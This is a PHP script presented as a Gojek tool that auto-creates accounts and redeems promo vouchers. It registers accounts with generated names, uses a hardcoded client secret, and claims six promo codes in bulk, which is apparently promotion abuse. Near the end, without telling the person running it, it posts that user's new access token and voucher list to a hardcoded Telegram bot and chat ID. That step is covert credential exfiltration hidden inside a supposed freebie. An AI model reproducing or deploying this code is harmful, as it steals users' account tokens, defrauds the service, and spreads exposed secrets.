<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("green"," =================================== \n");
echo color("green"," Claim Voucher \n");
echo color("green"," Auto Create & Redeem Voucher \n");
echo color("green"," =================================== \n");
echo " Created by : Vino AZR \n";
echo " Version    : 555 \n";
echo " Time       : ".date('d-m-Y||H:i:s')." \n";
echo color("green"," =================================== \n");

//	function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","?] Number : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
			}
			else if(substr(trim($nohp), 0, 2)=='62'){
				$hp = '6'.substr(trim($nohp), 1);
			}
			else{
				$hp = '1'.substr(trim($nohp),0,13);
			}
		}
		
		$data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
			$otptoken = getStr('"otp_token":"','"',$register);
			echo color("green","+] Verification code has been sent")."\n";
			otp:
			echo color("nevy","?] OTP : ");
			$otp = trim(fgets(STDIN));
			$data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
			$verif = request("/v5/customers/phone/verify", null, $data1);
			if(strpos($verif, '"access_token"')){
				echo color("green","+] Register Success\n");
				$token = getStr('"access_token":"','"',$verif);
				$uuid = getStr('"resource_owner_id":',',',$verif);
				echo color("green","+] Your access token : ".$token."\n\n");
				save("token.txt",$token);
				
				echo color("green","\n===========(REDEEM VOUCHER)===========");
				echo "\n".color("yellow","!] Claim Voc Car");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOCAR"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Ride");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGORIDE"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Food");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOOD022620A"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Cashbasck 4K");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"BELANJAINAJA"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Cashbasck 5K");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOPAYKIRIMPAKET"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				echo "\n".color("yellow","!] Claim Voc Cashbasck 20K");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				sleep(3);
				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"DWIPUTRA"}');
				$message = fetch_value($gocar,'"message":"','"');
				echo "\n".color("green","+] Message: ".$message);
				sleep(3);
				
				$cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
				$total = fetch_value($cekvoucher,'"total_vouchers":',',');
				$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
				$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
				$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
				$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
				$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
				$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
				$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
				$voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
				$voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
				$voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
				$voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
				$voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
				$voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
				$voucher14 = getStr1('"title":"','",',$cekvoucher,"14");
				$voucher15 = getStr1('"title":"','",',$cekvoucher,"15");
				$voucher16 = getStr1('"title":"','",',$cekvoucher,"16");
				$voucher17 = getStr1('"title":"','",',$cekvoucher,"17");
				$voucher18 = getStr1('"title":"','",',$cekvoucher,"18");
				$voucher19 = getStr1('"title":"','",',$cekvoucher,"19");
				$voucher20 = getStr1('"title":"','",',$cekvoucher,"20");
				$voucher21 = getStr1('"title":"','",',$cekvoucher,"21");
				$voucher22 = getStr1('"title":"','",',$cekvoucher,"22");
				$voucher23 = getStr1('"title":"','",',$cekvoucher,"23");
				$voucher24 = getStr1('"title":"','",',$cekvoucher,"24");
				$voucher25 = getStr1('"title":"','",',$cekvoucher,"25");
				$voucher26 = getStr1('"title":"','",',$cekvoucher,"26");
				$voucher27 = getStr1('"title":"','",',$cekvoucher,"27");
				$voucher28 = getStr1('"title":"','",',$cekvoucher,"28");
				$voucher29 = getStr1('"title":"','",',$cekvoucher,"29");
				$voucher30 = getStr1('"title":"','",',$cekvoucher,"30");
				$voucher31 = getStr1('"title":"','",',$cekvoucher,"31");
				$voucher32 = getStr1('"title":"','",',$cekvoucher,"32");
				$voucher33 = getStr1('"title":"','",',$cekvoucher,"33");
				$voucher34 = getStr1('"title":"','",',$cekvoucher,"34");
				$voucher35 = getStr1('"title":"','",',$cekvoucher,"35");
				$voucher36 = getStr1('"title":"','",',$cekvoucher,"36");
				$voucher37 = getStr1('"title":"','",',$cekvoucher,"37");
				$voucher38 = getStr1('"title":"','",',$cekvoucher,"38");
				$voucher39 = getStr1('"title":"','",',$cekvoucher,"39");
				$voucher40 = getStr1('"title":"','",',$cekvoucher,"40");
				$voucher41 = getStr1('"title":"','",',$cekvoucher,"41");
				$voucher42 = getStr1('"title":"','",',$cekvoucher,"42");
				$voucher43 = getStr1('"title":"','",',$cekvoucher,"43");
				$voucher44 = getStr1('"title":"','",',$cekvoucher,"44");
				$voucher45 = getStr1('"title":"','",',$cekvoucher,"45");
				$voucher46 = getStr1('"title":"','",',$cekvoucher,"46");
				$voucher47 = getStr1('"title":"','",',$cekvoucher,"47");
				$voucher48 = getStr1('"title":"','",',$cekvoucher,"48");
				$voucher49 = getStr1('"title":"','",',$cekvoucher,"49");
				$voucher50 = getStr1('"title":"','",',$cekvoucher,"50");
				
				echo "\n".color("yellow","-> Total voucher ".$total." : ");
				echo "\n".color("green","1. ".$voucher1);
				echo "\n".color("green","2. ".$voucher2);
				echo "\n".color("green","3. ".$voucher3);
				echo "\n".color("green","4. ".$voucher4);
				echo "\n".color("green","5. ".$voucher5);
				echo "\n".color("green","6. ".$voucher6);
				echo "\n".color("green","7. ".$voucher7);
				echo "\n".color("green","7. ".$voucher8);
				echo "\n".color("green","7. ".$voucher9);
				echo "\n".color("green","7. ".$voucher10);
				echo "\n".color("green","1. ".$voucher11);
				echo "\n".color("green","2. ".$voucher12);
				echo "\n".color("green","3. ".$voucher13);
				echo "\n".color("green","4. ".$voucher14);
				echo "\n".color("green","5. ".$voucher15);
				echo "\n".color("green","6. ".$voucher16);
				echo "\n".color("green","7. ".$voucher17);
				echo "\n".color("green","7. ".$voucher18);
				echo "\n".color("green","7. ".$voucher19);
				echo "\n".color("green","7. ".$voucher20);
				echo "\n".color("green","1. ".$voucher21);
				echo "\n".color("green","2. ".$voucher22);
				echo "\n".color("green","3. ".$voucher23);
				echo "\n".color("green","4. ".$voucher24);
				echo "\n".color("green","5. ".$voucher25);
				echo "\n".color("green","6. ".$voucher26);
				echo "\n".color("green","7. ".$voucher27);
				echo "\n".color("green","7. ".$voucher28);
				echo "\n".color("green","7. ".$voucher29);
				echo "\n".color("green","7. ".$voucher30);
				echo "\n".color("green","1. ".$voucher31);
				echo "\n".color("green","2. ".$voucher32);
				echo "\n".color("green","3. ".$voucher33);
				echo "\n".color("green","4. ".$voucher34);
				echo "\n".color("green","5. ".$voucher35);
				echo "\n".color("green","6. ".$voucher36);
				echo "\n".color("green","7. ".$voucher37);
				echo "\n".color("green","7. ".$voucher38);
				echo "\n".color("green","7. ".$voucher39);
				echo "\n".color("green","7. ".$voucher40);
				echo "\n".color("green","1. ".$voucher41);
				echo "\n".color("green","2. ".$voucher42);
				echo "\n".color("green","3. ".$voucher43);
				echo "\n".color("green","4. ".$voucher44);
				echo "\n".color("green","5. ".$voucher45);
				echo "\n".color("green","6. ".$voucher46);
				echo "\n".color("green","7. ".$voucher47);
				echo "\n".color("green","7. ".$voucher48);
				echo "\n".color("green","7. ".$voucher49);
				echo "\n".color("green","7. ".$voucher50);
				echo"\n";
				
				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
				$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
				$expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
				$expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
				$expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
				$expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
				$expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
				$expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
				$expired14 = getStr1('"expiry_date":"','"',$cekvoucher,'14');
				$expired15 = getStr1('"expiry_date":"','"',$cekvoucher,'15');
				$expired16 = getStr1('"expiry_date":"','"',$cekvoucher,'16');
				$expired17 = getStr1('"expiry_date":"','"',$cekvoucher,'17');
				$expired18 = getStr1('"expiry_date":"','"',$cekvoucher,'18');
				$expired19 = getStr1('"expiry_date":"','"',$cekvoucher,'19');
				$expired20 = getStr1('"expiry_date":"','"',$cekvoucher,'20');
				$expired21 = getStr1('"expiry_date":"','"',$cekvoucher,'21');
				$expired22 = getStr1('"expiry_date":"','"',$cekvoucher,'22');
				$expired23 = getStr1('"expiry_date":"','"',$cekvoucher,'23');
				$expired24 = getStr1('"expiry_date":"','"',$cekvoucher,'24');
				$expired25 = getStr1('"expiry_date":"','"',$cekvoucher,'25');
				$expired26 = getStr1('"expiry_date":"','"',$cekvoucher,'26');
				$expired27 = getStr1('"expiry_date":"','"',$cekvoucher,'27');
				$expired28 = getStr1('"expiry_date":"','"',$cekvoucher,'28');
				$expired29 = getStr1('"expiry_date":"','"',$cekvoucher,'29');
				$expired30 = getStr1('"expiry_date":"','"',$cekvoucher,'30');
				$expired31 = getStr1('"expiry_date":"','"',$cekvoucher,'31');
				$expired32 = getStr1('"expiry_date":"','"',$cekvoucher,'32');
				$expired33 = getStr1('"expiry_date":"','"',$cekvoucher,'33');
				$expired34 = getStr1('"expiry_date":"','"',$cekvoucher,'34');
				$expired35 = getStr1('"expiry_date":"','"',$cekvoucher,'35');
				$expired36 = getStr1('"expiry_date":"','"',$cekvoucher,'36');
				$expired37 = getStr1('"expiry_date":"','"',$cekvoucher,'37');
				$expired38 = getStr1('"expiry_date":"','"',$cekvoucher,'38');
				$expired39 = getStr1('"expiry_date":"','"',$cekvoucher,'39');
				$expired40 = getStr1('"expiry_date":"','"',$cekvoucher,'40');
				$expired41 = getStr1('"expiry_date":"','"',$cekvoucher,'41');
				$expired42 = getStr1('"expiry_date":"','"',$cekvoucher,'42');
				$expired43 = getStr1('"expiry_date":"','"',$cekvoucher,'43');
				$expired44 = getStr1('"expiry_date":"','"',$cekvoucher,'44');
				$expired45 = getStr1('"expiry_date":"','"',$cekvoucher,'45');
				$expired46 = getStr1('"expiry_date":"','"',$cekvoucher,'46');
				$expired47 = getStr1('"expiry_date":"','"',$cekvoucher,'47');
				$expired48 = getStr1('"expiry_date":"','"',$cekvoucher,'48');
				$expired49 = getStr1('"expiry_date":"','"',$cekvoucher,'49');
				$expired50 = getStr1('"expiry_date":"','"',$cekvoucher,'50');
				
				$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
				$chatid = "785784404";
				$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+]
				".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+]
				".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."]\n[+]
				
				".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+] ".$voucher14."\n[+] Exp : [".$expired14."]\n[+] ".$voucher15."\n[+] Exp : [".$expired15."]\n[+]
				".$voucher16."\n[+] Exp : [".$expired16."]\n[+] ".$voucher17."\n[+] Exp : [".$expired17."]\n[+] ".$voucher18."\n[+] Exp : [".$expired18."]\n[+] ".$voucher19."\n[+] Exp : [".$expired19."]\n[+] ".$voucher20."\n[+] Exp : [".$expired20."]\n[+]
				
				".$voucher21."\n[+] Exp : [".$expired21."]\n[+] ".$voucher22."\n[+] Exp : [".$expired22."]\n[+] ".$voucher23."\n[+] Exp : [".$expired23."]\n[+] ".$voucher24."\n[+] Exp : [".$expired24."]\n[+] ".$voucher25."\n[+] Exp : [".$expired25."]\n[+]
				".$voucher26."\n[+] Exp : [".$expired26."]\n[+] ".$voucher27."\n[+] Exp : [".$expired27."]\n[+] ".$voucher28."\n[+] Exp : [".$expired28."]\n[+] ".$voucher29."\n[+] Exp : [".$expired29."]\n[+] ".$voucher30."\n[+] Exp : [".$expired30."]\n[+]
				
				".$voucher31."\n[+] Exp : [".$expired31."]\n[+] ".$voucher32."\n[+] Exp : [".$expired32."]\n[+] ".$voucher33."\n[+] Exp : [".$expired33."]\n[+] ".$voucher34."\n[+] Exp : [".$expired34."]\n[+] ".$voucher35."\n[+] Exp : [".$expired35."]\n[+]
				".$voucher36."\n[+] Exp : [".$expired36."]\n[+] ".$voucher37."\n[+] Exp : [".$expired37."]\n[+] ".$voucher38."\n[+] Exp : [".$expired38."]\n[+] ".$voucher39."\n[+] Exp : [".$expired39."]\n[+] ".$voucher40."\n[+] Exp : [".$expired40."]\n[+]
				
				".$voucher41."\n[+] Exp : [".$expired41."]\n[+] ".$voucher42."\n[+] Exp : [".$expired42."]\n[+] ".$voucher43."\n[+] Exp : [".$expired43."]\n[+] ".$voucher44."\n[+] Exp : [".$expired44."]\n[+] ".$voucher45."\n[+] Exp : [".$expired45."]\n[+]
				".$voucher46."\n[+] Exp : [".$expired46."]\n[+] ".$voucher47."\n[+] Exp : [".$expired47."]\n[+] ".$voucher48."\n[+] Exp : [".$expired48."]\n[+] ".$voucher49."\n[+] Exp : [".$expired49."]\n[+] ".$voucher50."\n[+] Exp : [".$expired50."]";
				$method	= "sendMessage";
				$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
				$post = ['chat_id' => $chatid, 'text' => $pesan];
				$header = ["X-Requested-With: XMLHttpRequest",
					"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];
				$ch = curl_init();
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_URL, $url);
					curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				$datas = curl_exec($ch);
				$error = curl_error($ch);
				$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
					curl_close($ch);
				$debug['text'] = $pesan;
				$debug['respon'] = json_decode($datas, true);
			}else{
				echo color("red","-] The code you entered is incorrect");
				echo color("green", "\n =================================== \n\n");
				echo color("yellow","!] Please input again \n");
				goto otp;
			}
		}else{
			echo color("red","-] This number already registered");
			echo color("green", "\n =================================== \n\n");
			echo color("yellow","!] Please register again using other number \n");
			goto ulang;
		}
//	}
// echo change()."\n";
